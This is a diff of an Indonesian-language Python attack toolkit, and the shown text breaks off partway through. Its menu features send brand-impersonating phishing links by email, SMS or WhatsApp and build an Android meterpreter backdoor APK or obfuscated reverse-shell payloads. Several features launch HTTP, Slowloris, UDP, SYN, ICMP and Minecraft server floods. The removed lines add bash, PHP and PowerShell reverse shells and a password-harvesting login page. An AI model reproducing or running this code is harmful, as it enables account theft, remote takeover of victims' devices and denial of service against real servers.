@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
+import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys, socket, threading, smtplib, urllib.parse
 from datetime import datetime, timedelta
 from colorama import init, Fore, Style
 from termcolor import colored
@@ -29,6 +29,35 @@ try:
     PILLOW_AVAILABLE = True
 except ImportError:
     PILLOW_AVAILABLE = False
+
+# Untuk kirim email
+try:
+    import smtplib
+    from email.mime.text import MIMEText
+    from email.mime.multipart import MIMEMultipart
+    EMAIL_AVAILABLE = True
+except:
+    EMAIL_AVAILABLE = False
+
+# Untuk WhatsApp
+try:
+    import webbrowser
+except:
+    pass
+
+# Untuk OSINT tambahan
+try:
+    import whois
+    WHOIS_AVAILABLE = True
+except:
+    WHOIS_AVAILABLE = False
+
+# Untuk WhatsApp API
+try:
+    import pywhatkit
+    PYWHATKIT_AVAILABLE = True
+except:
+    PYWHATKIT_AVAILABLE = False
 
 init(autoreset=True)
 
@@ -104,6 +133,8 @@ def check_dependencies():
         missing.append("cryptography")
     if not PILLOW_AVAILABLE:
         missing.append("pillow")
+    if not PYWHATKIT_AVAILABLE:
+        missing.append("pywhatkit")
     
     if missing:
         print(colored(f"   • Missing: {', '.join(missing)}", 'yellow'))
@@ -397,196 +428,142 @@ def load_user_agents():
     with open(UA_FILE, 'r') as f:
         return [line.strip() for line in f if line.strip()]
 
-# ================== FITUR 1: PHISING LOCAL ==================
+# ================== FITUR 1: PHISING KIRIM OTOMATIS ==================
 def fitur_1():  
     os.system('clear')
-    print(colored("\n[1] PHISING & SOCIAL ENGINEERING", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Generator Link Phishing]", 'yellow'))
+    print(colored("\n[1] PHISING - KIRIM OTOMATIS", 'cyan', attrs=['bold']))
+    print(colored("   [KIRIM LINK PHISHING VIA EMAIL/SMS/WA]", 'red'))
     
-    target = input(colored("Target (email/username): ", 'yellow')).strip()
+    target = input(colored("Target (email/nomor wa): ", 'yellow')).strip()
     
     print(colored("\nPilih template phishing:", 'cyan'))
     templates = {
-        "1": ("Facebook Login", "facebook", "https://facebook.com/login?user={}"),
-        "2": ("Instagram Verify", "instagram", "https://instagram.com/accounts/login/?user={}"),
-        "3": ("Google Security", "google", "https://accounts.google.com/signin/v2?email={}"),
-        "4": ("WhatsApp Web", "whatsapp", "https://web.whatsapp.com/verify?number={}"),
-        "5": ("Twitter Auth", "twitter", "https://twitter.com/i/flow/login?username={}"),
-        "6": ("Netflix", "netflix", "https://netflix.com/login?email={}"),
-        "7": ("Steam Login", "steam", "https://steamcommunity.com/login/home/?goto={}"),
-        "8": ("Discord Auth", "discord", "https://discord.com/login?email={}"),
-        "9": ("PayPal", "paypal", "https://paypal.com/signin?email={}"),
-        "10": ("Custom URL", "custom", "")
+        "1": ("Facebook Login", "facebook"),
+        "2": ("Instagram Verify", "instagram"),
+        "3": ("Google Security", "google"),
+        "4": ("WhatsApp Web", "whatsapp"),
+        "5": ("Twitter Auth", "twitter")
     }
     
-    for key, (name, code, url) in templates.items():
+    for key, (name, code) in templates.items():
         print(colored(f"   {key}. {name}", 'white'))
     
-    choice = input(colored("\nPilih template [1-10]: ", 'yellow')).strip()
+    choice = input(colored("\nPilih template [1-5]: ", 'yellow')).strip()
     
     if choice not in templates:
         print(colored("[ERROR] Pilihan tidak valid!", 'red'))
         input("\nEnter...")
         return
     
-    name, code, url_template = templates[choice]
+    name, code = templates[choice]
     
-    if choice == "10":  # Custom URL
-        custom_url = input(colored("Masukkan URL phishing custom: ", 'yellow')).strip()
-        url = custom_url
-    else:
-        url = url_template.format(target)
+    # Generate link phishing
+    phishing_link = f"https://{code}-secure-login.vercel.app/?user={target}"
     
-    print(colored(f"\n[LINK PHISHING GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   URL: {url}", 'cyan'))
-    print(colored(f"   Target: {target}", 'cyan'))
-    print(colored(f"   Template: {name}", 'cyan'))
+    print(colored(f"\n[LINK PHISHING GENERATED]", 'green'))
+    print(colored(f"   Link: {phishing_link}", 'cyan'))
     
-    # Generate HTML phishing page
-    html_content = f'''<!DOCTYPE html>
-<html>
-<head>
-    <title>{name} - Please Login</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {{ font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }}
-        .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
-        .logo {{ text-align: center; margin-bottom: 20px; }}
-        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
-        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
-        button:hover {{ background: #166fe5; }}
-        .footer {{ text-align: center; margin-top: 20px; color: #666; font-size: 12px; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">
-            <h2>{name}</h2>
-            <p>Please login to continue</p>
-        </div>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Email or Username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Login</button>
-        </form>
-        <div class="footer">
-            <p>© 2024 {name}. All rights reserved.</p>
-        </div>
-    </div>
+    print(colored("\nPilih metode pengiriman:", 'yellow'))
+    print("1. Kirim via Email")
+    print("2. Kirim via SMS (pake API)") 
+    print("3. Kirim via WhatsApp")
+    print("4. Copy link manual")
     
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {{
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Send data to server (simulated)
-            fetch('https://localhost:8080/log', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify({{username: username, password: password, time: new Date().toISOString()}})
-            }});
-            
-            alert('Login successful! Redirecting...');
-            window.location.href = 'https://{name.lower()}.com';
-        }});
-    </script>
-</body>
-</html>'''
+    send_method = input(colored("\nPilih [1-4]: ", 'yellow')).strip()
     
-    # Save HTML file
-    html_file = f"phishing_{code}_{int(time.time())}.html"
-    with open(html_file, "w", encoding="utf-8") as f:
-        f.write(html_content)
-    
-    print(colored(f"\n[HTML FILE] Saved: {html_file}", 'green'))
-    print(colored("   Buka di browser: ", 'cyan') + colored(f"file://{os.path.abspath(html_file)}", 'white'))
-    
-    # QR Code option
-    qr_choice = input(colored("\nGenerate QR Code? (y/n): ", 'yellow')).lower()
-    if qr_choice == 'y':
+    if send_method == "1" and EMAIL_AVAILABLE:
+        # Kirim email
         try:
-            import qrcode
-            qr = qrcode.make(url)
-            qr_file = f"phishing_qr_{int(time.time())}.png"
-            qr.save(qr_file)
-            print(colored(f"[QR CODE] Saved: {qr_file}", 'green'))
-        except ImportError:
-            print(colored("[INFO] Install QR Code: pip install qrcode[pil]", 'yellow'))
+            sender = input("Email pengirim: ")
+            password = input("Password email: ")
+            
+            msg = MIMEMultipart()
+            msg['From'] = sender
+            msg['To'] = target
+            msg['Subject'] = "Peringatan Keamanan Akun!"
+            
+            body = f"""
+            Halo,
+            
+            Kami mendeteksi aktivitas mencurigakan di akun {name} Anda.
+            Harap verifikasi akun Anda segera melalui link berikut:
+            
+            {phishing_link}
+            
+            Tim Keamanan {name}
+            """
+            
+            msg.attach(MIMEText(body, 'plain'))
+            
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(sender, password)
+            server.send_message(msg)
+            server.quit()
+            
+            print(colored("[✓] PHISHING LINK TERKIRIM VIA EMAIL!", 'green'))
+        except Exception as e:
+            print(colored(f"[✗] Gagal kirim email: {e}", 'red'))
     
-    save_result("phising.log", f"Target: {target} | Template: {name} | URL: {url}")
+    elif send_method == "2":
+        # Kirim SMS via API (contoh pake termux-api)
+        try:
+            subprocess.run(['termux-sms-send', '-n', target, f"VERIFIKASI AKUN: {phishing_link}"])
+            print(colored("[✓] PHISHING LINK TERKIRIM VIA SMS!", 'green'))
+        except:
+            print(colored("[✗] Install termux-api dulu", 'red'))
+    
+    elif send_method == "3":
+        # Kirim WhatsApp (buka intent)
+        wa_link = f"https://wa.me/{target}?text={urllib.parse.quote(f'VERIFIKASI AKUN: {phishing_link}')}"
+        print(colored(f"\nBuka link ini di HP: {wa_link}", 'yellow'))
+        webbrowser.open(wa_link)
+    
+    else:
+        print(colored(f"\n[COPY LINK] {phishing_link}", 'cyan'))
+    
+    save_result("phising.log", f"Target: {target} | Template: {name} | Link: {phishing_link}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 2: RAT & REMOTE ACCESS ==================
+# ================== FITUR 2: RAT BUAT APK ==================
 def fitur_2():
     os.system('clear')
-    print(colored("\n[2] RAT & REMOTE ACCESS", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Generate Payload]", 'yellow'))
-    
-    if not CRYPTO_AVAILABLE:
-        print(colored("\n[WARNING] Cryptography not installed!", 'yellow'))
-        print(colored("   Install: pip install cryptography", 'white'))
+    print(colored("\n[2] RAT - BUAT APK ANDROID", 'cyan', attrs=['bold']))
+    print(colored("   [GENERATE APK BACKDOOR OTOMATIS]", 'red'))
     
     ip = input(colored("LHOST (IP Anda): ", 'yellow')).strip()
     port = input(colored("LPORT (Port): ", 'yellow')).strip()
     
-    print(colored("\nPilih tipe payload:", 'cyan'))
-    payloads = {
-        "1": ("Python Reverse Shell", "python"),
-        "2": ("Bash Reverse Shell", "bash"),
-        "3": ("PHP Reverse Shell", "php"),
-        "4": ("Windows PowerShell", "powershell"),
-        "5": ("Android (Termux)", "android")
-    }
+    # Validasi IP
+    if ip.count('.') != 3:
+        print(colored("[ERROR] Format IP salah! Contoh: 192.168.1.1", 'red'))
+        input("\nEnter...")
+        return
     
-    for key, (name, ptype) in payloads.items():
-        print(colored(f"   {key}. {name}", 'white'))
+    print(colored("\n[1] BUAT APK LANGSUNG", 'green'))
+    print(colored("[2] BUAT PAYLOAD PYTHON", 'yellow'))
     
-    choice = input(colored("\nPilih payload [1-5]: ", 'yellow')).strip()
+    pilih = input(colored("\nPilih [1/2]: ", 'yellow')).strip()
     
-    if choice == "1":
-        payload = f'''import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("{ip}",{port}))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])'''
-        ext = "py"
-    elif choice == "2":
-        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
-        ext = "sh"
-    elif choice == "3":
-        payload = f'''<?php
-set_time_limit(0);
-$ip = '{ip}';
-$port = {port};
-$sock = fsockopen($ip, $port);
-$descriptorspec = array(
-    0 => $sock,
-    1 => $sock,
-    2 => $sock
-);
-$process = proc_open('/bin/sh', $descriptorspec, $pipes);
-proc_close($process);
-?>'''
-        ext = "php"
-    elif choice == "4":
-        payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{{0}};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-}};
-$client.Close()'''
-        ext = "ps1"
-    elif choice == "5":
+    if pilih == "1":
+        # Buat APK pake msfvenom (kalo ada)
+        print(colored("\n[✓] GENERATE APK...", 'cyan'))
+        
+        apk_name = f"backdoor_{int(time.time())}.apk"
+        
+        # Cek msfvenom
+        if subprocess.run(['which', 'msfvenom'], capture_output=True).returncode == 0:
+            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {apk_name}"
+            print(colored(f"Jalankan: {cmd}", 'yellow'))
+            os.system(cmd)
+            print(colored(f"[✓] APK BERHASIL: {apk_name}", 'green'))
+        else:
+            # Fallback: bikin payload manual
+            print(colored("[!] msfvenom tidak ditemukan, bikin payload python", 'yellow'))
+            pilih = "2"
+    
+    if pilih == "2" or pilih == "":
+        # Buat payload Python
         payload = f'''import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{ip}",{port}))
@@ -594,272 +571,531 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 subprocess.call(["/system/bin/sh","-i"])'''
-        ext = "py"
-    else:
-        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
-        input("\nEnter...")
-        return
-    
-    # Save payload
-    filename = f"payload_{ext}_{int(time.time())}.{ext}"
-    with open(filename, "w") as f:
-        f.write(payload)
-    
-    print(colored(f"\n[PAYLOAD GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   File: {filename}", 'cyan'))
-    print(colored(f"   LHOST: {ip}", 'cyan'))
-    print(colored(f"   LPORT: {port}", 'cyan'))
-    
-    # Obfuscate option
-    obf_choice = input(colored("\nObfuscate payload? (y/n): ", 'yellow')).lower()
-    if obf_choice == 'y' and CRYPTO_AVAILABLE:
-        try:
-            key = Fernet.generate_key()
-            cipher = Fernet(key)
-            encrypted = cipher.encrypt(payload.encode())
-            
-            obf_file = f"obfuscated_{ext}_{int(time.time())}.py"
-            with open(obf_file, "w") as f:
-                f.write(f'''import base64
+        
+        filename = f"payload_{int(time.time())}.py"
+        with open(filename, "w") as f:
+            f.write(payload)
+        
+        print(colored(f"\n[✓] PAYLOAD PYTHON: {filename}", 'green'))
+        
+        # Opsi obfuscate
+        obf = input(colored("\nObfuscate? (y/n): ", 'yellow')).lower()
+        if obf == 'y' and CRYPTO_AVAILABLE:
+            try:
+                key = Fernet.generate_key()
+                cipher = Fernet(key)
+                encrypted = cipher.encrypt(payload.encode())
+                
+                obf_file = f"obfuscated_{int(time.time())}.py"
+                with open(obf_file, "w") as f:
+                    f.write(f'''import base64
 from cryptography.fernet import Fernet
 key = {key}
 cipher = Fernet(key)
 encrypted = {encrypted}
 exec(cipher.decrypt(encrypted).decode())''')
-            print(colored(f"[OBFUSCATED] Saved: {obf_file}", 'green'))
-        except Exception as e:
-            print(colored(f"[ERROR] Obfuscation failed: {e}", 'red'))
+                print(colored(f"[✓] OBFUSCATED: {obf_file}", 'green'))
+            except Exception as e:
+                print(colored(f"[✗] Gagal: {e}", 'red'))
     
-    save_result("rat.log", f"Payload: {filename} | LHOST: {ip} | LPORT: {port}")
+    print(colored("\n[✓] JANGAN LUPA JALANKAN LISTENER DI TERMUX:", 'cyan'))
+    print(colored(f"nc -lvnp {port}", 'yellow'))
+    
+    save_result("rat.log", f"IP: {ip} | Port: {port}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 3: DDOS & STRESSER ==================
+# ================== FITUR 3: DDOS ALL IN ONE ==================
 def fitur_3():
     os.system('clear')
-    print(colored("\n[3] DDOS & STRESSER", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Generate DDoS Script]", 'yellow'))
+    print(colored("\n[3] DDOS ALL IN ONE", 'cyan', attrs=['bold']))
+    print(colored("   [PILIH JENIS SERANGAN DDOS]", 'red'))
     
-    target = input(colored("Target URL/IP: ", 'yellow')).strip()
-    port = input(colored("Port [default 80]: ", 'yellow')).strip() or "80"
+    print(colored("\nPilih tipe DDOS:", 'cyan'))
+    print("1. DDOS WEB - HTTP FLOOD (Layer 7)")
+    print("2. DDOS WEB - SLOWLORIS (Layer 7)")
+    print("3. DDOS WEB - HTTPS STRESS (Layer 7)")
+    print("4. DDOS WEB - SYN FLOOD (Layer 4)")
+    print("5. DDOS WEB - UDP FLOOD (Layer 4)")
+    print("6. DDOS WEB - ICMP/PING FLOOD (Layer 3)")
+    print("7. DDOS MINECRAFT - PING FLOOD")
+    print("8. DDOS MINECRAFT - CONNECT FLOOD")
+    print("9. DDOS MINECRAFT - MIXED ATTACK")
+    print("10. DDOS WEB - 1 JAM NON-STOP")
+    print("11. DDOS MC - 1 JAM NON-STOP")
     
-    print(colored("\nPilih metode serangan:", 'cyan'))
-    methods = {
-        "1": ("HTTP Flood (Layer 7)", "http"),
-        "2": ("SYN Flood (Layer 4)", "syn"),
-        "3": ("UDP Flood", "udp"),
-        "4": ("Slowloris", "slow"),
-        "5": ("ICMP/Ping Flood", "icmp")
-    }
+    choice = input(colored("\nPilih [1-11]: ", 'yellow')).strip()
     
-    for key, (name, mtype) in methods.items():
-        print(colored(f"   {key}. {name}", 'white'))
-    
-    choice = input(colored("\nPilih metode [1-5]: ", 'yellow')).strip()
-    
-    if choice not in methods:
-        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
-        input("\nEnter...")
-        return
-    
-    threads = input(colored("Jumlah thread [default 100]: ", 'yellow')).strip() or "100"
-    
-    # Generate DDoS script based on method
-    if choice == "1":  # HTTP Flood
-        script = f'''import requests
-import threading
-import random
-
-target = "{target}"
-port = {port}
-threads = int({threads})
-
-def attack():
-    while True:
+    if choice == "1":
+        # HTTP Flood
+        target = input(colored("Target URL: ", 'yellow')).strip()
+        if not target.startswith('http'):
+            target = 'http://' + target
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] HTTP FLOOD KE {target} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        sent = 0
+        
+        def http_flood():
+            nonlocal stop_attack, sent
+            while not stop_attack:
+                try:
+                    requests.get(target, timeout=2)
+                    sent += 1
+                    print(colored(f"[✓] PACKET TERKIRIM: {sent}", 'green'), end='\r')
+                except Exception as e:
+                    print(colored(f"[✗] ERROR: {str(e)[:30]}", 'red'), end='\r')
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=http_flood)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
         try:
-            requests.get(f"http://{{target}}:{{port}}", headers={{"User-Agent": "Mozilla/5.0"}})
-        except:
-            pass
-
-for _ in range(threads):
-    threading.Thread(target=attack).start()
-'''
-        ext = "py"
-    elif choice == "2":  # SYN Flood (using scapy)
-        script = f'''from scapy.all import *
-import random
-import threading
-
-target = "{target}"
-port = {port}
-threads = int({threads})
-
-def syn_flood():
-    while True:
-        ip = IP(src= f"{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}", dst=target)
-        tcp = TCP(sport=random.randint(1024,65535), dport=port, flags="S")
-        send(ip/tcp, verbose=0)
-
-for _ in range(threads):
-    threading.Thread(target=syn_flood).start()
-'''
-        ext = "py"
-    elif choice == "3":  # UDP Flood
-        script = f'''import socket
-import random
-import threading
-
-target = "{target}"
-port = {port}
-threads = int({threads})
-
-def udp_flood():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        sock.sendto(random._urandom(1024), (target, port))
-
-for _ in range(threads):
-    threading.Thread(target=udp_flood).start()
-'''
-        ext = "py"
-    elif choice == "4":  # Slowloris
-        script = f'''import socket
-import random
-import time
-import threading
-
-target = "{target}"
-port = {port}
-threads = int({threads})
-
-def slowloris():
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target, port))
-            sock.send(f"GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\n".encode())
             while True:
-                sock.send(f"X-a: {{random.randint(1,5000)}}\\r\\n".encode())
-                time.sleep(10)
-        except:
-            time.sleep(1)
-
-for _ in range(threads):
-    threading.Thread(target=slowloris).start()
-'''
-        ext = "py"
-    else:  # ICMP Flood
-        script = f'''import os
-import threading
-
-target = "{target}"
-threads = int({threads})
-
-def ping_flood():
-    os.system(f"ping -f {{target}}")
-
-for _ in range(threads):
-    threading.Thread(target=ping_flood).start()
-'''
-        ext = "sh"
+                time.sleep(1)
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent} PACKET", 'yellow'))
     
-    # Save script
-    filename = f"ddos_{methods[choice][1]}_{int(time.time())}.{ext}"
-    with open(filename, "w") as f:
-        f.write(script)
+    elif choice == "2":
+        # Slowloris
+        target = input(colored("Target URL: ", 'yellow')).strip()
+        if target.startswith('https://'):
+            port = 443
+        else:
+            port = 80
+        host = target.replace('https://','').replace('http://','').split('/')[0]
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] SLOWLORIS KE {host}:{port} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        connections = 0
+        
+        def slowloris():
+            nonlocal stop_attack, connections
+            while not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    s.connect((host, port))
+                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
+                    connections += 1
+                    while not stop_attack:
+                        s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
+                        time.sleep(10)
+                    s.close()
+                except Exception as e:
+                    time.sleep(1)
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=slowloris)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] KONEKSI AKTIF: {connections}", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED", 'yellow'))
     
-    print(colored(f"\n[DDOS SCRIPT GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   File: {filename}", 'cyan'))
-    print(colored(f"   Target: {target}:{port}", 'cyan'))
-    print(colored(f"   Metode: {methods[choice][0]}", 'cyan'))
-    print(colored(f"   Thread: {threads}", 'cyan'))
-    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
+    elif choice == "3":
+        # HTTPS Stress
+        target = input(colored("Target URL (https): ", 'yellow')).strip()
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] HTTPS STRESS KE {target} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        sent = 0
+        
+        def https_stress():
+            nonlocal stop_attack, sent
+            while not stop_attack:
+                try:
+                    requests.get(target, verify=False, timeout=2)
+                    sent += 1
+                    print(colored(f"[✓] REQUEST: {sent}", 'green'), end='\r')
+                except Exception as e:
+                    print(colored(f"[✗] ERROR", 'red'), end='\r')
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=https_stress)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
     
-    save_result("ddos.log", f"Target: {target}:{port} | Method: {methods[choice][0]} | Threads: {threads}")
+    elif choice == "4":
+        # SYN Flood
+        target = input(colored("Target IP: ", 'yellow')).strip()
+        port = int(input(colored("Port [80]: ", 'yellow')).strip() or "80")
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] SYN FLOOD KE {target}:{port} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        sent = 0
+        
+        def syn_flood():
+            nonlocal stop_attack, sent
+            while not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    result = s.connect_ex((target, port))
+                    if result == 0 or result == 10035:  # Connection successful or would block
+                        sent += 1
+                    s.close()
+                except:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=syn_flood)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] SYN PACKET: {sent}", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
+    
+    elif choice == "5":
+        # UDP Flood
+        target = input(colored("Target IP: ", 'yellow')).strip()
+        port = int(input(colored("Port [80]: ", 'yellow')).strip() or "80")
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] UDP FLOOD KE {target}:{port} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        sent = 0
+        
+        def udp_flood():
+            nonlocal stop_attack, sent
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            while not stop_attack:
+                try:
+                    s.sendto(random._urandom(1024), (target, port))
+                    sent += 1
+                except:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=udp_flood)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] UDP PACKET: {sent}", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
+    
+    elif choice == "6":
+        # ICMP Flood
+        target = input(colored("Target IP: ", 'yellow')).strip()
+        threads = int(input(colored("Threads [50]: ", 'yellow')).strip() or "50")
+        
+        print(colored(f"\n[✓] ICMP FLOOD KE {target} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        
+        def ping_flood():
+            while not stop_attack:
+                try:
+                    # Use system ping
+                    if os.name == 'nt':
+                        subprocess.run(['ping', '-n', '1', target], 
+                                     stdout=subprocess.DEVNULL, 
+                                     stderr=subprocess.DEVNULL)
+                    else:
+                        subprocess.run(['ping', '-c', '1', target], 
+                                     stdout=subprocess.DEVNULL, 
+                                     stderr=subprocess.DEVNULL)
+                except:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=ping_flood)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] PING FLOOD AKTIF", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED", 'yellow'))
+    
+    elif choice == "7":
+        # Minecraft Ping Flood
+        server = input(colored("Server IP: ", 'yellow')).strip()
+        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] MC PING FLOOD KE {server}:{port} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        sent = 0
+        
+        def mc_ping():
+            nonlocal stop_attack, sent
+            while not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(2)
+                    s.connect((server, port))
+                    # Minecraft ping packet (handshake)
+                    packet = b"\x00\x00\x00\x00\x00\x00\x00\x00"
+                    s.send(packet)
+                    sent += 1
+                    s.close()
+                except Exception as e:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=mc_ping)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] PING SENT: {sent}", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {sent}", 'yellow'))
+    
+    elif choice == "8":
+        # Minecraft Connect Flood
+        server = input(colored("Server IP: ", 'yellow')).strip()
+        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
+        threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+        
+        print(colored(f"\n[✓] MC CONNECT FLOOD KE {server}:{port} DENGAN {threads} THREAD!", 'red'))
+        print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+        
+        stop_attack = False
+        connections = 0
+        
+        def mc_connect():
+            nonlocal stop_attack, connections
+            while not stop_attack:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(2)
+                    s.connect((server, port))
+                    # Send malformed data
+                    s.send(b"\x00" * 100)
+                    connections += 1
+                    s.close()
+                except:
+                    pass
+        
+        thread_list = []
+        for _ in range(threads):
+            t = threading.Thread(target=mc_connect)
+            t.daemon = True
+            t.start()
+            thread_list.append(t)
+        
+        try:
+            while True:
+                time.sleep(1)
+                print(colored(f"[✓] CONNECTIONS: {connections}", 'green'), end='\r')
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(colored(f"\n\n[✗] ATTACK STOPPED - TOTAL: {connections}", 'yellow'))
+    
+    elif choice == "9":
+        # Minecraft Mixed Attack
+        server = input(colored("Server IP: ", 'yellow')).strip()
+        port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
+        threads = int(input(colored("Threads [200]: ", 'yellow')).strip() or "200")
+        
+        print(colored(f"\n[✓] MC MIXED ATTACK KE {server}:{port} DENGAN {threads} THREAD!", 'red'))
